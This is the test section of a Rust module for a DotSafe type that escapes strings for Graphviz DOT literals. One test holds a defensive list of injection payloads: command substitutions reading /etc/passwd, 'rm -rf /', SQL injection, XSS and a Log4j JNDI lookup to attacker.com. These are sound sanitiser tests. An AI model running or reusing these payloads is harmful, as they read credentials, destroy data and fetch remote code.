        // Borrow & Hash/Set operations
        let borrowed: &str = safe.borrow();
        assert_eq!(borrowed, "test-value");

        let mut set = HashSet::new();
        set.insert(safe.clone());
        assert!(set.contains("test-value"));
        assert!(set.contains(String::from("test-value").as_str()));

        let mut btree = BTreeSet::new();
        btree.insert(safe.clone());
        assert!(btree.contains("test-value"));

        // From / Into String
        let owned: String = safe.clone().into();
        assert_eq!(owned, "test-value");
        assert_eq!(safe.into_inner(), "test-value");

        // FromStr
        let parsed = "parsed_node".parse::<DotSafe>().unwrap();
        assert_eq!(parsed, "parsed_node");
        assert!("bad\"node".parse::<DotSafe>().is_err());

        // TryFrom String
        let owned_valid = DotSafe::try_from(String::from("valid_owned")).unwrap();
        assert_eq!(owned_valid, "valid_owned");
        assert!(DotSafe::try_from(String::from("invalid\"owned")).is_err());

        // Default
        let default_val = DotSafe::default();
        assert_eq!(default_val, "");
        assert!(default_val.is_empty());
    }

    #[test]
    fn test_dot_safe_symmetric_partial_eq() {
        let s = DotSafe::try_from("abc").unwrap();

        // &str
        assert_eq!(s, "abc");
        assert_eq!("abc", s);
        assert_eq!(s, *"abc");
        assert_eq!(*"abc", s);

        // String
        assert_eq!(s, String::from("abc"));
        assert_eq!(String::from("abc"), s);
        assert_eq!(s, &String::from("abc"));
        assert_eq!(&String::from("abc"), s);

        // DotSafe
        let s2 = DotSafe::try_from("abc").unwrap();
        assert_eq!(s, s2);

        let diff = DotSafe::try_from("def").unwrap();
        assert_ne!(s, diff);
        assert_ne!(s, "def");
        assert_ne!("def", s);
    }

    #[test]
    fn test_dot_safe_serde_json_roundtrip() {
        let safe = DotSafe::try_from("valid_identifier-42").unwrap();
        let json = serde_json::to_string(&safe).unwrap();
        assert_eq!(json, "\"valid_identifier-42\"");

        let deserialized: DotSafe = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized, safe);
    }

    #[test]
    fn test_dot_safe_serde_json_rejection() {
        // Double quotes inside JSON string
        let bad_quote = r#""hello\"world""#;
        assert!(serde_json::from_str::<DotSafe>(bad_quote).is_err());

        // Backslashes inside JSON string
        let bad_slash = r#""path\\to""#;
        assert!(serde_json::from_str::<DotSafe>(bad_slash).is_err());

        // Newline inside JSON string
        let bad_newline = "\"line1\\nline2\"";
        assert!(serde_json::from_str::<DotSafe>(bad_newline).is_err());

        // Control characters inside JSON string
        let bad_control = "\"ansi\\u001bcolor\"";
        assert!(serde_json::from_str::<DotSafe>(bad_control).is_err());
    }

    #[test]
    fn test_is_dot_unsafe_and_contains() {
        assert!(is_dot_unsafe_character('"'));
        assert!(is_dot_unsafe_character('\\'));
        assert!(is_dot_unsafe_character('\n'));
        assert!(is_dot_unsafe_character('\r'));
        assert!(is_dot_unsafe_character('\t'));
        assert!(is_dot_unsafe_character('\0'));
        assert!(is_dot_unsafe_character('\x1b'));
        assert!(is_dot_unsafe_character('\x7f'));
        assert!(is_dot_unsafe_character('\u{009B}'));

        assert!(!is_dot_unsafe_character('a'));
        assert!(!is_dot_unsafe_character('0'));
        assert!(!is_dot_unsafe_character('-'));
        assert!(!is_dot_unsafe_character('_'));
        assert!(!is_dot_unsafe_character('.'));
        assert!(!is_dot_unsafe_character('/'));
        assert!(!is_dot_unsafe_character(':'));
        assert!(!is_dot_unsafe_character('🦀'));

        assert!(contains_dot_unsafe_characters("hello\"world"));
        assert!(contains_dot_unsafe_characters("hello\\world"));
        assert!(contains_dot_unsafe_characters("hello\nworld"));
        assert!(!contains_dot_unsafe_characters("hello world 🦀"));
    }

    #[test]
    fn test_dot_safe_all_c0_c1_control_codes_rejected_and_lossy_replaced() {
        // C0 controls (0x00..=0x1F) and DEL (0x7F)
        for code in (0u8..=0x1Fu8).chain(std::iter::once(0x7Fu8)) {
            let c = code as char;
            let raw = format!("prefix{c}suffix");

            // Strict validation must reject every single control character
            let err = DotSafe::try_from(raw.as_str()).unwrap_err();
            assert_eq!(err.character(), c);
            assert_eq!(err.byte_index(), 6);

            // Lossy conversion must handle the control character safely
            let lossy = DotSafe::from_str_lossy(&raw);
            if c == '\n' {
                assert_eq!(lossy.as_str(), "prefix\\nsuffix");
            } else if c == '\r' {
                assert_eq!(lossy.as_str(), format!("prefix{}suffix", char::REPLACEMENT_CHARACTER));
            } else {
                assert_eq!(lossy.as_str(), format!("prefix{}suffix", char::REPLACEMENT_CHARACTER));
            }

            // In all cases, no raw control character should remain in the output string
            assert!(
                !contains_control_characters(lossy.as_str()),
                "lossy output for char {c:?} (U+{:04X}) still contained control characters: {:?}",
                c as u32,
                lossy.as_str()
            );
        }

        // C1 controls (0x80..=0x9F)
        for code in 0x80u32..=0x9Fu32 {
            let c = char::from_u32(code).unwrap();
            let raw = format!("start{c}end");

            let err = DotSafe::try_from(raw.as_str()).unwrap_err();
            assert_eq!(err.character(), c);
            assert_eq!(err.byte_index(), 5);

            let lossy = DotSafe::from_str_lossy(&raw);
            assert_eq!(lossy.as_str(), format!("start{}end", char::REPLACEMENT_CHARACTER));
            assert!(!contains_control_characters(lossy.as_str()));
        }
    }

    #[test]
    fn test_dot_safe_nested_quotes_and_backslashes_combinatorics() {
        let test_cases = [
            // Quotes only: 1 to 5 quotes
            ("\"", "\\\""),
            ("\"\"", "\\\"\\\""),
            ("\"\"\"", "\\\"\\\"\\\""),
            ("\"\"\"\"", "\\\"\\\"\\\"\\\""),
            ("\"\"\"\"\"", "\\\"\\\"\\\"\\\"\\\""),
            // Backslashes only: 1 to 5 backslashes
            ("\\", "\\\\"),
            ("\\\\", "\\\\\\\\"),
            ("\\\\\\", "\\\\\\\\\\\\"),
            ("\\\\\\\\", "\\\\\\\\\\\\\\\\"),
            ("\\\\\\\\\\", "\\\\\\\\\\\\\\\\\\\\"),
            // Mixed quotes and backslashes
            (r#"\""#, r#"\\\""#),
            (r#"\"\""#, r#"\\\"\\\""#),
            (r#"\\""#, r#"\\\\\""#),
            (r#"\\\""#, r#"\\\\\\\""#),
            (r#"\"\\"#, r#"\\\"\\\\"#),
            (r#"\"\"\""#, r#"\\\"\\\"\\\""#),
            (r#"\\\"\\\""#, r#"\\\\\\\"\\\\\\\""#),
            (r#"a"b\c"d\e"f\"#, r#"a\"b\\c\"d\\e\"f\\"#),
            (r#"\""""\""#, r#"\\\"\"\"\"\\\""#),
            // Embedded raw newlines with quotes and slashes
            ("\"foo\"\n\"bar\"", "\\\"foo\\\"\\n\\\"bar\\\""),
            ("\"foo\"\r\n\"bar\"", "\\\"foo\\\"\\n\\\"bar\\\""),
            (r#"path\with"quotes"and\newlines\n"#, r#"path\\with\"quotes\"and\\newlines\\n"#),
        ];

        for (input, expected_lossy) in test_cases {
            // Strict try_from must reject
            assert!(
                DotSafe::try_from(input).is_err(),
                "TryFrom unexpectedly succeeded for {input:?}"
            );

            // Lossy must match expected
            let lossy = DotSafe::from_str_lossy(input);
            assert_eq!(lossy.as_str(), expected_lossy, "Lossy mismatch for input {input:?}");

            // DOT quoted literal check
            let dot_literal = format!("\"{}\"", lossy.as_str());
            assert!(
                verify_dot_quoted_literal(&dot_literal),
                "DOT literal syntax violation for {dot_literal:?}"
            );
        }
    }

    #[test]
    fn test_dot_safe_trailing_backslashes_battery() {
        let trailing_cases = [
            (r#"abc\"#, r#"abc\\"#),
            (r#"abc\\"#, r#"abc\\\\"#),
            (r#"abc\\\"#, r#"abc\\\\\\"#),
            (r#"abc\\\\"#, r#"abc\\\\\\\\"#),
            (r#"abc\\\\\"#, r#"abc\\\\\\\\\\"#),
            (r#"\"#, r#"\\"#),
            (r#"\\"#, r#"\\\\"#),
            (r#"\\\"#, r#"\\\\\\"#),
            (r#"\\\\"#, r#"\\\\\\\\"#),
            (r#"/usr/local/bin\"#, r#"/usr/local/bin\\"#),
            (r#"C:\Program Files\"#, r#"C:\\Program Files\\"#),
        ];

        for (input, expected) in trailing_cases {
            assert!(DotSafe::try_from(input).is_err());
            let lossy = DotSafe::from_str_lossy(input);
            assert_eq!(lossy.as_str(), expected);

            // Crucial security invariant: In format!("\"{}\"", lossy), the trailing backslashes
            // must NOT escape the closing quote delimiter.
            let dot_literal = format!("\"{}\"", lossy.as_str());
            assert!(
                verify_dot_quoted_literal(&dot_literal),
                "Trailing backslash escaped closing quote in {dot_literal:?}"
            );
        }
    }

    #[test]
    fn test_dot_safe_unicode_homoglyphs_and_bidi() {
        // Homoglyphs are valid Unicode characters and not ASCII '"' or '\'
        let homoglyph_cases = [
            // Fullwidth quote and backslash
            "＂fullwidth_quote＂",
            "＼fullwidth_backslash＼",
            // Curly and typographic quotes
            "“left_double” “right_double”",
            "‘left_single’ ‘right_single’",
            "„low_double‟",
            "«guillemet_left» «guillemet_right»",
            "‹single_guillemet›",
            // Slash lookalikes
            "division∕slash",
            "fraction⁄slash",
            "set∖minus",
            // Unicode bidi / zero-width characters
            "bidi\u{202E}rtl_override\u{202C}",
            "zero\u{200B}width\u{200C}space\u{200D}",
            "\u{FEFF}byte_order_mark",
            // Complex emoji sequences with ZWJ
            "👨‍👩‍👧‍👦_family",
            "🏴‍☠️_pirate_flag",
        ];

        for sample in homoglyph_cases {
            let safe = DotSafe::try_from(sample).unwrap();
            assert_eq!(safe.as_str(), sample);

            let lossy = DotSafe::from_str_lossy(sample);
            assert_eq!(lossy.as_str(), sample);

            let dot_literal = format!("\"{}\"", lossy.as_str());
            assert!(verify_dot_quoted_literal(&dot_literal));
        }
    }

    #[test]
    fn test_dot_safe_adversarial_breakout_payloads_battery() {
        let attack_payloads = [
            // 1. Node definition breakouts
            r#""}; node [shape=doublecircle, fillcolor=red, label="hacked"]; {""#,
            r#"node_1" [color=red, label="hijacked"]; ""#,
            r#"node_1"; "injected_node" [label="pwned"]; """#,
            // 2. Subgraph cluster breakouts
            r#""]; } subgraph cluster_pwned { label="injected"; rank=same; { ""#,
            r#""} subgraph cluster_0 { a -> b; } digraph { ""#,
            // 3. Digraph boundary breakouts
            r#""]; } digraph second_graph { injected_node; } digraph original { ""#,
            r#""; } strict digraph { a -> b; } ""#,
            // 4. Attribute tampering
            r#"] [color=red] [label="spoofed"] [shape=diamond"#,
            r#""] fontsize=24 fontcolor=red label="alert" ["#,
            r#""] style="filled" fillcolor="yellow" ["#,
            // 5. Edge hijacking
            r#"" -> "evil_target" [color=red, label="hijacked"]; "node_orig"#,
            r#"" -- "undirected_target" [style=dotted]; """#,
            // 6. Port / compass spoofing
            r#"node_1:port_a:nw" -> "node_2:port_b:se"#,
            r#"orig_node":n -> "target_node":s"#,
            // 7. HTML-like label injection
            r#"<HTML><BODY><TABLE BORDER="1"><TR><TD>PWNED</TD></TR></TABLE></BODY></HTML>"#,
            r#"<TABLE><TR><TD PORT="p1">Port</TD></TR></TABLE>"#,
            r#""> <TABLE><TR><TD>Injected</TD></TR></TABLE> <""#,
            // 8. Multi-line comment injection
            "/*\nmultiline\ncomment\n*/ node [color=red]; // line\n",
            "// line comment\nnode_2 [label=\"injected\"];\n",
            "<!-- xml style comment -->",
            // 9. ANSI escape sequences
            "\x1b[31;1;4mRED\x1b[0m\x1b]0;TITLE\x07",
            "\x1b[2J\x1b[H\x1b[?25h",
            // 10. C1 CSI sequences
            "\u{009B}31mC1_CSI\u{009B}0m",
            "\u{009D}0;OSC_TITLE\u{009C}",
            // 11. Terminal clear and overwrite
            "\r\x1b[2K\x1b[1;1HInjected",
            // 12. Format strings and command injection
            "%s%s%n%x%d",
            "$(cat /etc/passwd)",
            "`id`",
            "; rm -rf / ;",
            // 13. SQLi / XSS variants
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            // 14. Log4j / JNDI payloads
            "${jndi:ldap://attacker.com/exploit}",
            // 15. Null-byte truncation attempts
            "safe_prefix\0evil_suffix",
            "\0\0\0",
        ];

        for payload in attack_payloads {
            // If the payload contains any unsafe character (", \, control chars), TryFrom MUST reject it
            if contains_dot_unsafe_characters(payload) {
                assert!(
                    DotSafe::try_from(payload).is_err(),
                    "TryFrom failed to reject attack payload: {payload:?}"
                );
            }

            // Lossy conversion must sanitize the payload
            let safe = DotSafe::from_str_lossy(payload);

            // In all cases, verify that wrapping in double quotes produces a strictly valid DOT literal
            let dot_literal = format!("\"{}\"", safe.as_str());
            assert!(
                verify_dot_quoted_literal(&dot_literal),
                "DOT literal syntax broken by payload {payload:?} -> {dot_literal:?}"
            );

            // Verify no raw control characters survived
            assert!(
                !contains_control_characters(safe.as_str()),
                "Raw control characters survived in payload {payload:?} -> {:?}",
                safe.as_str()
            );
        }
    }

    #[test]
    fn test_dot_safe_oracle_fuzzing() {
        // Deterministic pseudo-random string generator testing 5000 combinations
        let char_pool: Vec<char> = vec![
            'a', 'Z', '0', '_', '-', '.', '/', ':', '@', ' ', '"', '\\', '\n', '\r', '\t', '\0',
            '\x1b', '\x07', '\x7f', '\u{0080}', '\u{009B}', '\u{009F}', '“', '”', '＼', '🦀', '日',
            '本', '語',
        ];

        let mut lcg: u64 = 0x123456789ABCDEF;
        let mut next_rand = || -> usize {
            lcg = lcg.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
            (lcg >> 32) as usize
        };

        for _ in 0..5000 {
            let len = next_rand() % 32;
            let mut s = String::with_capacity(len);
            for _ in 0..len {
                let idx = next_rand() % char_pool.len();
                s.push(char_pool[idx]);
            }

            // Validate strict mode
            let has_unsafe = contains_dot_unsafe_characters(&s);
            let try_res = DotSafe::try_from(s.as_str());
            assert_eq!(
                try_res.is_ok(),
                !has_unsafe,
                "Mismatch between contains_dot_unsafe_characters and try_from for {s:?}"
            );

            // Validate lossy mode
            let lossy = DotSafe::from_str_lossy(&s);
            let dot_literal = format!("\"{}\"", lossy.as_str());
            assert!(
                verify_dot_quoted_literal(&dot_literal),
                "Fuzzing failed for input {s:?} -> {dot_literal:?}"
            );
        }
    }

    #[test]
    fn test_dot_safe_multibyte_utf8_exhaustive_boundary_matrix() {
        let prefixes: &[(&str, usize)] = &[
            ("a", 1),
            ("Z", 1),
            ("9", 1),
            ("-", 1),
            ("é", 2),
            ("Ω", 2),
            ("д", 2),
            ("ש", 2),
            ("ع", 2),
            ("本", 3),
            ("語", 3),
            ("€", 3),
            ("→", 3),
            ("漢", 3),
            ("🦀", 4),
            ("🚀", 4),
            ("🔒", 4),
            ("𝄞", 4),
            ("こんにちは", 15),
            ("👨‍👩‍👧‍👦", 25),
        ];

        let unsafe_chars: &[char] = &[
            '"', '\\', '\n', '\r', '\t', '\0', '\x07', '\x08', '\x1b', '\x7f', '\u{0080}',
            '\u{009B}', '\u{009F}',
        ];

        for &(prefix, expected_prefix_bytes) in prefixes {
            assert_eq!(
                prefix.len(),
                expected_prefix_bytes,
                "Prefix {prefix:?} byte length mismatch"
            );

            for &bad_char in unsafe_chars {
                let suffix = "🚀世界";
                let s = format!("{prefix}{bad_char}{suffix}");

                // 1. Strict validation MUST reject and report exact byte offset
                let err = match DotSafe::try_from(s.as_str()) {
                    Err(e) => e,
                    Ok(_) => panic!(
                        "TryFrom unexpectedly succeeded for prefix={prefix:?}, bad_char={bad_char:?}"
                    ),
                };
                assert_eq!(
                    err.byte_index(),
                    expected_prefix_bytes,
                    "Byte index mismatch for prefix={prefix:?}, bad_char={bad_char:?}"
                );
                assert_eq!(
                    err.character(),
                    bad_char,
                    "Character mismatch for prefix={prefix:?}, bad_char={bad_char:?}"
                );

                // 2. Lossy conversion must preserve prefix and suffix exactly
                let lossy = DotSafe::from_str_lossy(&s);
                assert!(
                    lossy.as_str().starts_with(prefix),
                    "Lossy string did not preserve prefix {prefix:?} in {lossy:?}"
                );
                assert!(
                    lossy.as_str().ends_with(suffix),
                    "Lossy string did not preserve suffix {suffix:?} in {lossy:?}"
                );

                // 3. Quoted DOT literal must be syntax-valid
                let dot_literal = format!("\"{}\"", lossy.as_str());
                assert!(
                    verify_dot_quoted_literal(&dot_literal),
                    "Invalid DOT literal for prefix={prefix:?}, bad_char={bad_char:?} -> {dot_literal:?}"
                );
            }
        }
    }

    #[test]
    fn test_dot_safe_zero_length_and_whitespace_variations() {
        // Empty string
        let empty = DotSafe::try_from("").unwrap();
        assert_eq!(empty.as_str(), "");
        assert_eq!(empty.len(), 0);
        assert!(empty.is_empty());
        assert_eq!(DotSafe::from_str_lossy("").as_str(), "");
        assert!(verify_dot_quoted_literal(r#""""#));

        // ASCII spaces
        let single_space = DotSafe::try_from(" ").unwrap();
        assert_eq!(single_space.as_str(), " ");
        let multi_space = DotSafe::try_from("     ").unwrap();
        assert_eq!(multi_space.as_str(), "     ");
        let mixed_space = DotSafe::try_from("  foo   bar  ").unwrap();
        assert_eq!(mixed_space.as_str(), "  foo   bar  ");

        // Unicode whitespace categories (valid UTF-8, non-control)
        let unicode_whitespaces = [
            ("\u{00A0}", "No-Break Space"),
            ("\u{1680}", "Ogham Space Mark"),
            ("\u{2000}", "En Quad"),
            ("\u{2001}", "Em Quad"),
            ("\u{2002}", "En Space"),
            ("\u{2003}", "Em Space"),
            ("\u{2004}", "Three-Per-Em Space"),
            ("\u{2005}", "Four-Per-Em Space"),
            ("\u{2006}", "Six-Per-Em Space"),
            ("\u{2007}", "Figure Space"),
            ("\u{2008}", "Punctuation Space"),
            ("\u{2009}", "Thin Space"),
            ("\u{200A}", "Hair Space"),
            ("\u{202F}", "Narrow No-Break Space"),
            ("\u{205F}", "Medium Mathematical Space"),
            ("\u{3000}", "Ideographic Space"),
            ("\u{200B}", "Zero-Width Space"),
        ];

        for (ws, name) in unicode_whitespaces {
            let safe =
                DotSafe::try_from(ws).unwrap_or_else(|_| panic!("Failed for {name} ({ws:?})"));
            assert_eq!(safe.as_str(), ws);
            let lossy = DotSafe::from_str_lossy(ws);
            assert_eq!(lossy.as_str(), ws);

            let dot_literal = format!("\"{}\"", lossy.as_str());
            assert!(
                verify_dot_quoted_literal(&dot_literal),
                "Invalid DOT literal for {name}: {dot_literal:?}"
            );
        }
    }

    #[test]
    fn test_dot_safe_extremely_large_strings_100kb_plus() {
        // 1. Clean 150KB ASCII string
        let large_clean_ascii = "a".repeat(150_000);
        let safe = DotSafe::try_from(large_clean_ascii.as_str()).unwrap();
        assert_eq!(safe.len(), 150_000);
        assert_eq!(DotSafe::from_str_lossy(&large_clean_ascii).len(), 150_000);

        // 2. Clean 650KB Multibyte string (50,000 repeats of 13-byte "🦀日本語")
        let large_multibyte = "🦀日本語".repeat(50_000);
        assert_eq!(large_multibyte.len(), 650_000);
        let safe_mb = DotSafe::try_from(large_multibyte.as_str()).unwrap();
        assert_eq!(safe_mb.len(), 650_000);
        assert_eq!(DotSafe::from_str_lossy(&large_multibyte).len(), 650_000);

        // 3. Unsafe 150KB string with single bad character at the very end
        let mut large_bad_end = "a".repeat(150_000);
        large_bad_end.push('"');
        let err_end = DotSafe::try_from(large_bad_end.as_str()).unwrap_err();
        assert_eq!(err_end.byte_index(), 150_000);
        assert_eq!(err_end.character(), '"');

        // 4. Unsafe 150KB string with bad character at byte 75,000
        let mut large_bad_mid = "b".repeat(75_000);
        large_bad_mid.push('\\');
        large_bad_mid.push_str(&"c".repeat(75_000));
        let err_mid = DotSafe::try_from(large_bad_mid.as_str()).unwrap_err();
        assert_eq!(err_mid.byte_index(), 75_000);
        assert_eq!(err_mid.character(), '\\');

        // 5. Dense 100KB+ adversarial string with 10,000 quotes, backslashes, and newlines
        let attack_chunk = r#"node_"val"\dir\n"#; // 16 bytes containing ", \, \n
        let dense_attack = attack_chunk.repeat(10_000); // 160KB
        assert!(DotSafe::try_from(dense_attack.as_str()).is_err());

        let lossy = DotSafe::from_str_lossy(&dense_attack);
        assert!(lossy.len() > dense_attack.len());
        let dot_literal = format!("\"{}\"", lossy.as_str());
        assert!(
            verify_dot_quoted_literal(&dot_literal),
            "Dense 160KB attack string produced invalid DOT literal"
        );
    }

    #[test]
    fn test_dot_safe_unicode_non_characters_and_pua() {
        // Unicode Non-characters: U+FDD0..=U+FDEF
        for code in 0xFDD0u32..=0xFDEFu32 {
            let c = char::from_u32(code).unwrap();
            let s = format!("prefix_{c}_suffix");
            let safe = DotSafe::try_from(s.as_str()).unwrap();
            assert_eq!(safe.as_str(), s);
            let lossy = DotSafe::from_str_lossy(&s);
            assert_eq!(lossy.as_str(), s);
        }

        // Special non-characters
        let special_non_chars = [
            '\u{FFFE}',
            '\u{FFFF}',
            '\u{1FFFE}',
            '\u{1FFFF}',
            '\u{2FFFE}',
            '\u{2FFFF}',
            '\u{10FFFE}',
            '\u{10FFFF}',
        ];
        for &c in &special_non_chars {
            let s = format!("nonchar_{c}");
            let safe = DotSafe::try_from(s.as_str()).unwrap();
            assert_eq!(safe.as_str(), s);
            let lossy = DotSafe::from_str_lossy(&s);
            assert_eq!(lossy.as_str(), s);
        }

        // Private Use Area (PUA)
        let pua_samples = ['\u{E000}', '\u{E800}', '\u{F8FF}', '\u{F0000}', '\u{100000}'];
        for &c in &pua_samples {
            let s = format!("pua_{c}");
            let safe = DotSafe::try_from(s.as_str()).unwrap();
            assert_eq!(safe.as_str(), s);
            let lossy = DotSafe::from_str_lossy(&s);
            assert_eq!(lossy.as_str(), s);
        }

        // Bidi formatting controls
        let bidi_controls = [
            '\u{200E}', // LRM
            '\u{200F}', // RLM
            '\u{061C}', // ALM
            '\u{2066}', // LRI
            '\u{2067}', // RLI
            '\u{2068}', // FSI
            '\u{2069}', // PDI
        ];
        for &c in &bidi_controls {
            let s = format!("bidi_{c}_text");
            let safe = DotSafe::try_from(s.as_str()).unwrap();
            assert_eq!(safe.as_str(), s);
            let lossy = DotSafe::from_str_lossy(&s);
            assert_eq!(lossy.as_str(), s);
        }
    }

    #[test]
    fn test_dot_safe_serde_json_comprehensive_matrix() {
        use std::collections::HashMap;

        // 1. Valid roundtrip with complex characters
        let valid_cases = [
            "alphanumeric_123",
            "koid-42.service_name",
            "こんにちは 🦀 🚀",
            "Café résumé — 100%",
            "",
            "   leading and trailing spaces   ",
        ];

        for &val in &valid_cases {
            let safe = DotSafe::try_from(val).unwrap();
            let json = serde_json::to_string(&safe).unwrap();
            let deserialized: DotSafe = serde_json::from_str(&json).unwrap();
            assert_eq!(deserialized, safe);
            assert_eq!(deserialized.as_str(), val);
        }

        // 2. Unicode escape sequences in JSON that resolve to safe characters
        let json_escaped_unicode = "\"\\u0061\\u0062\\u0063\""; // "abc"
        let res: DotSafe = serde_json::from_str(json_escaped_unicode).unwrap();
        assert_eq!(res.as_str(), "abc");

        let json_surrogate_pair = "\"\\uD83E\\uDD80\""; // 🦀
        let res_emoji: DotSafe = serde_json::from_str(json_surrogate_pair).unwrap();
        assert_eq!(res_emoji.as_str(), "🦀");

        // 3. Strict rejection of JSON strings containing DOT-unsafe characters
        let invalid_json_strings = [
            r#""hello\"world""#,   // double quote
            r#""path\\to\\dir""#,  // backslash
            "\"line1\\nline2\"",   // newline
            "\"line1\\rline2\"",   // carriage return
            "\"tab\\tseparated\"", // tab
            "\"null\\u0000byte\"", // NUL control
            "\"ansi\\u001bcode\"", // ESC control
            "\"del\\u007fchar\"",  // DEL control
            "\"c1_\\u0080\"",      // C1 control U+0080
            "\"c1_\\u009B\"",      // C1 control U+009B
        ];

        for &invalid_json in &invalid_json_strings {
            let res: Result<DotSafe, _> = serde_json::from_str(invalid_json);
            assert!(
                res.is_err(),
                "Deserialization unexpectedly succeeded for invalid JSON: {invalid_json}"
            );
        }

        // 4. Malformed JSON types and payloads
        assert!(serde_json::from_str::<DotSafe>("12345").is_err());
        assert!(serde_json::from_str::<DotSafe>("true").is_err());
        assert!(serde_json::from_str::<DotSafe>("false").is_err());
        assert!(serde_json::from_str::<DotSafe>("null").is_err());
        assert!(serde_json::from_str::<DotSafe>(r#"["array"]"#).is_err());
        assert!(serde_json::from_str::<DotSafe>(r#"{"key": "value"}"#).is_err());
        assert!(serde_json::from_str::<DotSafe>(r#""unterminated"#).is_err());

        // 5. Container serialization and deserialization
        #[derive(Serialize, Deserialize, PartialEq, Debug)]
        struct NodeMetadata {
            id: u64,
            name: DotSafe,
            optional_alias: Option<DotSafe>,
            tags: Vec<DotSafe>,
            properties: HashMap<String, DotSafe>,
        }

        let mut properties = HashMap::new();
        properties.insert("vendor".to_string(), DotSafe::try_from("Google").unwrap());
        properties
            .insert("protocol".to_string(), DotSafe::try_from("fuchsia.hardware.pci").unwrap());

        let metadata = NodeMetadata {
            id: 101,
            name: DotSafe::try_from("root_pci_bus").unwrap(),
            optional_alias: Some(DotSafe::try_from("pci-root").unwrap()),
            tags: vec![
                DotSafe::try_from("bus").unwrap(),
                DotSafe::try_from("hardware").unwrap(),
                DotSafe::try_from("core").unwrap(),
            ],
            properties,
        };

        let json_meta = serde_json::to_string(&metadata).unwrap();
        let deserialized_meta: NodeMetadata = serde_json::from_str(&json_meta).unwrap();
        assert_eq!(deserialized_meta, metadata);

        // Injecting an invalid string inside nested JSON struct fails deserialization
        let bad_nested_json = json_meta.replace("root_pci_bus", "root_\"_pci_bus");
        assert!(serde_json::from_str::<NodeMetadata>(&bad_nested_json).is_err());
    }

    /// Verifies that `dot_literal` is a single, valid, properly escaped Graphviz DOT double-quoted
    /// string literal that does not terminate early or escape its closing delimiter.
    fn verify_dot_quoted_literal(dot_literal: &str) -> bool {
        if !dot_literal.starts_with('"') || !dot_literal.ends_with('"') || dot_literal.len() < 2 {
            return false;
        }

        let inner = &dot_literal[1..dot_literal.len() - 1];
        let mut escaped = false;
        let mut chars = inner.chars();

        while let Some(c) = chars.next() {
            if escaped {
                // In DOT string literals after DotSafe escaping, valid escape sequences are:
                // \\ (escaped backslash), \" (escaped quote), \n (escaped newline)
                if c != '\\' && c != '"' && c != 'n' {
                    return false;
                }
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == '"' {
                // An unescaped quote inside inner means the string literal terminated early!
                return false;
            } else if is_control_character(c) {
                // Raw control characters are forbidden inside DOT string literals
                return false;
            }
        }

        // If escaped is true at the end of inner, the trailing backslash escapes the closing quote!
        !escaped
    }
}
